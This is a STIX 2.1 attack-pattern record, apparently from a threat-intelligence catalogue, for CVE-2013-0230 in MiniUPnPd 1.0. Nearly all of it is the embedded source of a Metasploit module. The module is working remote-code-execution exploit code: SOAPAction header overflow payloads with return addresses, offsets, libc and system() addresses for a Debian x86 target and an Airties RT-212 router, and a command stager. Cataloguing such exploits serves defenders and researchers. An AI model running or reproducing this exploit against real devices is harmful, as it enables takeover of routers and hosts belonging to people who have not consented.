{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5d47b71-8a28-47ae-8630-29788b1d63c8",
    "created": "2024-08-14T16:58:24.694083Z",
    "modified": "2024-08-14T16:58:24.694086Z",
    "name": "MiniUPnPd 1.0 Stack Buffer Overflow Remote Code Execution",
    "description": " This module exploits the MiniUPnP 1.0 SOAP stack buffer overflow vulnerability present in the SOAPAction HTTP header handling. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/upnp/miniupnpd_soap_bof.rb",
            "external_id": "miniupnpd_soap_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0230"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  Rank = NormalRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MiniUPnPd 1.0 Stack Buffer Overflow Remote Code Execution',\n      'Description'    => %q{\n          This module exploits the MiniUPnP 1.0 SOAP stack buffer overflow vulnerability\n        present in the SOAPAction HTTP header handling.\n      },\n      'Author'         =>\n        [\n          'hdm', # Vulnerability discovery\n          'Dejan Lukan', # Metasploit module, debian target\n          'Onur ALANBEL', # Expliot for Airties target\n          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module, Airties target\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'EXITFUNC' => 'process', },\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_MIPSBE],\n      'References'     =>\n        [\n          [ 'CVE', '2013-0230' ],\n          [ 'OSVDB', '89624' ],\n          [ 'BID', '57608' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play']\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'  =>\n        [\n          [ 'Debian GNU/Linux 6.0 / MiniUPnPd 1.0',\n            {\n              'Ret'    => 0x0804ee43, # pop ebp # ret # from miniupnpd\n              'Offset' => 2123,\n              'Arch'   => ARCH_X86,\n              # the byte '\\x22' is the '\"' character and the miniupnpd scans for that character in the\n              # input, which is why it can't be part of the shellcode (otherwise the vulnerable part\n              # of the program is never reached)\n              'Payload'        =>\n                {\n                  'Space' => 2060,\n                  'BadChars' => \"\\x00\\x22\"\n                },\n              :callback => :target_debian\n            }\n          ],\n          [ 'Airties RT-212 v1.2.0.23 / MiniUPnPd 1.0',\n            {\n              'Offset'      => 2048,\n              'LibcBase'    => 0x2aabd000,\n              'System'      => 0x00031AC0,\n              'CallSystem'  => 0x0001CC94, # prepare $a0 and jump to $s0\n              'Fingerprint' => 'AirTies/ASP 1.0 UPnP/1.0 miniupnpd/1.0',\n              'Arch'        => ARCH_MIPSBE,\n              :callback     => :target_airties\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-03-27',\n    ))\n\n    register_options([\n      Opt::RPORT(5555),\n    ])\n\n    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'method'\t=> 'POST',\n        'uri'\t\t => '/'\n      })\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Safe\n    end\n\n    fingerprints = targets.collect { |t| t['Fingerprint'] }\n    fingerprints.delete(nil)\n\n    if res && fingerprints.include?(res.headers['Server'])\n      vprint_status(\"Fingerprint: #{res.headers['Server']}\")\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    unless self.respond_to?(target[:callback])\n      fail_with(Failure::BadConfig, 'Invalid target specified: no callback function defined')\n    end\n\n    self.send(target[:callback])\n  end\n\n  def target_debian\n    #\n    # Build the SOAP Exploit\n    #\n    # jmp 0x2d ; jump forward 0x2d bytes (jump right after the '#' char)\n    sploit\t= \"\\xeb\\x2d\"\n\n    # a valid action\n    sploit += \"n:schemas-upnp-org:service:WANIPConnection:1#\"\n\n    # payload\n    sploit += payload.encoded\n\n    # nops\n    sploit += rand_text(target['Offset'] - sploit.length - 16)\n\n    # overwrite registers on stack: the values are not used, so we can overwrite them with anything\n    sploit += rand_text(4)\t\t # overwrite EBX\n    sploit += rand_text(4)\t\t # overwrite ESI\n    sploit += rand_text(4)\t\t # overwrite EDI\n    sploit += rand_text(4)\t\t # overwrite EBP\n\n    # Overwrite EIP with addresss of \"pop ebp, ret\", because the second value on the\n    # stack points directly to the string after 'Soapaction: ', which is why we must\n    # throw the first value on the stack away, which we're doing with the pop ebp\n    # instruction. Then we're returning to the next value on the stack, which is\n    # exactly the address that we want.\n    sploit += [target.ret].pack('V')\n\n    # the ending \" character is necessary for the vulnerability to be reached\n    sploit += \"\\\"\"\n\n    # data sent in the POST body\n    data =\n      \"<?xml version='1.0' encoding=\\\"UTF-8\\\"?>\\r\\n\" +\n      \"<SOAP-ENV:Envelope\\r\\n\" +\n      \"\tSOAP-ENV:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\"\\r\\n\" +\n      \"\txmlns:SOAP-ENC=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\"\\r\\n\" +\n      \"\txmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"\\r\\n\" +\n      \">\\r\\n\" +\n      \"<SOAP-ENV:Body>\\r\\n\" +\n      \"<ns1:action xmlns:ns1=\\\"urn:schemas-upnp-org:service:WANIPConnection:1\\\" SOAP-ENC:root=\\\"1\\\">\\r\\n\" +\n      \"</ns1:action>\\r\\n\" +\n      \"</SOAP-ENV:Body>\\r\\n\" +\n      \"</SOAP-ENV:Envelope>\\r\\n\"\n\n    #\n    # Build and send the HTTP request\n    #\n    print_status(\"Sending exploit to victim #{target.name}...\")\n    send_request_cgi({\n      'method'\t=> 'POST',\n      'uri'\t\t => \"/\",\n      'headers' => {\n        'SOAPAction' => sploit,\n      },\n      'data'\t\t=> data,\n    })\n\n    # disconnect from the server\n    disconnect\n  end\n\n  def target_airties\n    print_status(\"Sending exploit to victim #{target.name}...\")\n    execute_cmdstager(\n      :flavor  => :echo\n    )\n  end\n\n  def execute_command(cmd, opts)\n    # Build the SOAP Exploit\n    # a valid action\n    sploit = \"n:schemas-upnp-org:service:WANIPConnection:1#\"\n    sploit << rand_text_alpha_upper(target['Offset'])\n    sploit << [target['LibcBase'] + target['System']].pack(\"N\")      # s0 - address of system\n    sploit << rand_text_alpha_upper(24)                              # $s1 - $s6\n    sploit << [target['LibcBase'] + target['CallSystem']].pack(\"N\")\n    # 0001CC94 addiu   $a0, $sp, 0x18\n    # 0001CC98 move    $t9, $s0\n    # 0001CC9C jalr    $t9\n    # 0001CCA0 li      $a1, 1\n\n    sploit << rand_text_alpha_upper(24)                              #filler\n    sploit << cmd\n\n    # data sent in the POST body\n    data =\n      \"<?xml version='1.0' encoding=\\\"UTF-8\\\"?>\\r\\n\" +\n      \"<SOAP-ENV:Envelope\\r\\n\" +\n      \"\tSOAP-ENV:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\"\\r\\n\" +\n      \"\txmlns:SOAP-ENC=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\"\\r\\n\" +\n      \"\txmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"\\r\\n\" +\n      \">\\r\\n\" +\n      \"<SOAP-ENV:Body>\\r\\n\" +\n      \"<ns1:action xmlns:ns1=\\\"urn:schemas-upnp-org:service:WANIPConnection:1\\\" SOAP-ENC:root=\\\"1\\\">\\r\\n\" +\n      \"</ns1:action>\\r\\n\" +\n      \"</SOAP-ENV:Body>\\r\\n\" +\n      \"</SOAP-ENV:Envelope>\\r\\n\"\n\n    send_request_cgi({\n      'method'\t=> 'POST',\n      'uri'\t\t => '/',\n      'headers' =>\n        {\n          'SOAPAction' => sploit,\n        },\n      'data'\t\t=> data\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-27",
    "x_mitre_platforms": [
        "linux'"
    ]
}